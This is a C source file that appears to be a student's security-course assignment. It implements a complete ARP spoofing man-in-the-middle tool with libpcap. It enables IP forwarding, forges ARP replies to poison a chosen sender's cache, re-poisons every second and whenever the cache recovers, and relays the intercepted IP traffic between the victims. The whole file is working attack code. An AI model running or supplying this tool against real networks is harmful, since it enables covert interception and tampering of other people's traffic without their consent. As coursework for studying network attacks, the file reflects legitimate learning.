#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <pcap.h>

#pragma pack(push, 1)
typedef struct {
    uint8_t  dmac[6];
    uint8_t  smac[6];
    uint16_t type;
} EthHdr;

typedef struct {
    uint16_t hrd;
    uint16_t pro;
    uint8_t  hln;
    uint8_t  pln;
    uint16_t op;
    uint8_t  smac[6];
    uint8_t  sip[4];
    uint8_t  tmac[6];
    uint8_t  tip[4];
} ArpHdr;

typedef struct {
    EthHdr eth;
    ArpHdr arp;
} EthArpPacket;

typedef struct {
    uint8_t  ver_ihl;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t checksum;
    uint8_t  sip[4];
    uint8_t  dip[4];
} IpHdr;
#pragma pack(pop)

#define MAX_FLOWS 32

// 나중에 이 Flow 라는 구조체 배열을 뒤에 선언 (sender, target) 한쌍을 묶는걸 구조체로 따로
typedef struct {
    uint8_t sender_ip[4];
    uint8_t target_ip[4];
    uint8_t sender_mac[6];
    uint8_t target_mac[6];
} Flow;

pcap_t* handle;
uint8_t my_mac[6];
uint8_t my_ip[4];
Flow flows[MAX_FLOWS];
int flow_cnt = 0;

//이 부분을 재부팅떄마다 터미널에 안해줬었더니 잘 패킷이 안잡혔어서 아예 넣음
void set_ip_forward(const char* iface) {
    char cmd[256];
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    system("echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects");
    system("echo 0 > /proc/sys/net/ipv4/conf/default/send_redirects");
    snprintf(cmd, sizeof(cmd),
        "echo 0 > /proc/sys/net/ipv4/conf/%s/send_redirects", iface);
    system(cmd);
}

//이전 과제에 있었던거 그대로 가져옴
void get_my_mac(const char* iface) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ioctl(sock, SIOCGIFHWADDR, &ifr);
    close(sock);
    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
}

void get_my_ip(const char* iface) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ioctl(sock, SIOCGIFADDR, &ifr);
    close(sock);
    struct sockaddr_in* sa = (struct sockaddr_in*)&ifr.ifr_addr;
    memcpy(my_ip, &sa->sin_addr.s_addr, 4);
}

//이전 과제에 있었던 ip 넣으면 mac 알아노는
void get_mac_by_arp(uint8_t* target_ip, uint8_t* out_mac) {
    EthArpPacket req;
    memset(req.eth.dmac, 0xff, 6);
    memcpy(req.eth.smac, my_mac, 6);
    req.eth.type = htons(0x0806);
    req.arp.hrd  = htons(1);
    req.arp.pro  = htons(0x0800);
    req.arp.hln  = 6;
    req.arp.pln  = 4;
    req.arp.op   = htons(1);
    memcpy(req.arp.smac, my_mac, 6);
    memcpy(req.arp.sip, my_ip, 4);
    memset(req.arp.tmac, 0x00, 6);
    memcpy(req.arp.tip, target_ip, 4);

    while (1) {
        pcap_sendpacket(handle, (const u_char*)&req, sizeof(req));

        time_t start = time(NULL);
        while (time(NULL) - start < 1) {
            struct pcap_pkthdr* info;
            const u_char* raw;
            int r = pcap_next_ex(handle, &info, &raw);
            if (r <= 0) continue;

            EthArpPacket* pkt = (EthArpPacket*)raw;
            if (ntohs(pkt->eth.type) == 0x0806 &&
                ntohs(pkt->arp.op) == 2 &&
                memcmp(pkt->arp.sip, target_ip, 4) == 0) {
                memcpy(out_mac, pkt->arp.smac, 6);
                return;
            }
        }
        printf("no reply, retrying...\n");
    }
}

//이번 과제에 추가된 attacker가 targer ip 라고 sender 속이는 함수
void send_arp_infect(uint8_t* sender_mac, uint8_t* sender_ip, uint8_t* target_ip) {
    EthArpPacket rep;
    memcpy(rep.eth.dmac, sender_mac, 6);
    memcpy(rep.eth.smac, my_mac, 6);
    rep.eth.type = htons(0x0806);
    rep.arp.hrd  = htons(1);
    rep.arp.pro  = htons(0x0800);
    rep.arp.hln  = 6;
    rep.arp.pln  = 4;
    rep.arp.op   = htons(2);
    memcpy(rep.arp.smac, my_mac, 6);
    memcpy(rep.arp.sip,  target_ip, 4);
    memcpy(rep.arp.tmac, sender_mac, 6);
    memcpy(rep.arp.tip,  sender_ip, 4);
    pcap_sendpacket(handle, (const u_char*)&rep, sizeof(rep));
}

//스푸핑된 패킷 받아서 제대로 relay 보내는 함수
void relay_ip_packet(const u_char* raw, int len, uint8_t* new_dmac) {
    u_char* buf = (u_char*)malloc(len);
    memcpy(buf, raw, len);
    EthHdr* eth = (EthHdr*)buf;
    memcpy(eth->smac, my_mac, 6);
    memcpy(eth->dmac, new_dmac, 6);
    pcap_sendpacket(handle, buf, len);
    free(buf);
}

//arp recover 감지 시 재감염시키는거
void check_and_reinfect(EthArpPacket* pkt) {
    for (int i = 0; i < flow_cnt; i++) {
        // target이 sender한테 ARP 보낼때 recover 발생
        if (memcmp(pkt->arp.sip,  flows[i].target_ip, 4) == 0 &&
            memcmp(pkt->eth.dmac, flows[i].sender_mac, 6) == 0) {
            send_arp_infect(flows[i].sender_mac,
                            flows[i].sender_ip,
                            flows[i].target_ip);
        }
        // sender가 target mac 물어볼때도 recover 발생
        if (memcmp(pkt->arp.tip, flows[i].target_ip, 4) == 0 &&
            memcmp(pkt->arp.sip, flows[i].sender_ip, 4) == 0) {
            send_arp_infect(flows[i].sender_mac,
                            flows[i].sender_ip,
                            flows[i].target_ip);
        }
    }
}

//패킷 처리되는 부분인데( 1초마다 주기적 재감염 시키는 부분 + ip 패킷 확인하고 relay 보내기 + arp 재감염 확인 3덩어리로 구성)
void packet_loop() {
    time_t last_infect = time(NULL);

    while (1) {
        // 1초마다 재감염
        if (time(NULL) - last_infect >= 1) {
            for (int i = 0; i < flow_cnt; i++)
                send_arp_infect(flows[i].sender_mac,
                                flows[i].sender_ip,
                                flows[i].target_ip);
            last_infect = time(NULL);
        }

        struct pcap_pkthdr* info;
        const u_char* raw;
        int r = pcap_next_ex(handle, &info, &raw);
        if (r <= 0) continue;

        int len = info->caplen;
        EthHdr* eth = (EthHdr*)raw;
        uint16_t type = ntohs(eth->type);

        if (type == 0x0800) {
            IpHdr* ip = (IpHdr*)(raw + sizeof(EthHdr));
            for (int i = 0; i < flow_cnt; i++) {
                if (memcmp(eth->dmac, my_mac, 6) == 0 &&
                    memcmp(ip->sip, flows[i].sender_ip, 4) == 0) {
                    relay_ip_packet(raw, len, flows[i].target_mac);
                    break;
                }
                if (memcmp(eth->dmac, my_mac, 6) == 0 &&
                    memcmp(ip->sip, flows[i].target_ip, 4) == 0) {
                    relay_ip_packet(raw, len, flows[i].sender_mac);
                    break;
                }
            }
        }

        if (type == 0x0806)
            check_and_reinfect((EthArpPacket*)raw);
    }
}

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* iface = argv[1];
    set_ip_forward(iface);

    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(iface, BUFSIZ, 1, 1, errbuf);
    if (!handle) {
        printf("pcap_open_live error: %s\n", errbuf);
        return -1;
    }

    get_my_mac(iface);
    get_my_ip(iface);

    for (int i = 2; i < argc; i += 2) {
        Flow* f = &flows[flow_cnt];

        sscanf(argv[i],   "%hhu.%hhu.%hhu.%hhu",
               &f->sender_ip[0], &f->sender_ip[1],
               &f->sender_ip[2], &f->sender_ip[3]);
        sscanf(argv[i+1], "%hhu.%hhu.%hhu.%hhu",
               &f->target_ip[0], &f->target_ip[1],
               &f->target_ip[2], &f->target_ip[3]);

        printf("getting sender mac...\n");
        get_mac_by_arp(f->sender_ip, f->sender_mac);
        printf("getting target mac...\n");
        get_mac_by_arp(f->target_ip, f->target_mac);

        send_arp_infect(f->sender_mac, f->sender_ip, f->target_ip);
        printf("infected flow %d\n", flow_cnt + 1);

        flow_cnt++;
    }

    printf("start\n");
    packet_loop();

    pcap_close(handle);
    return 0;
}
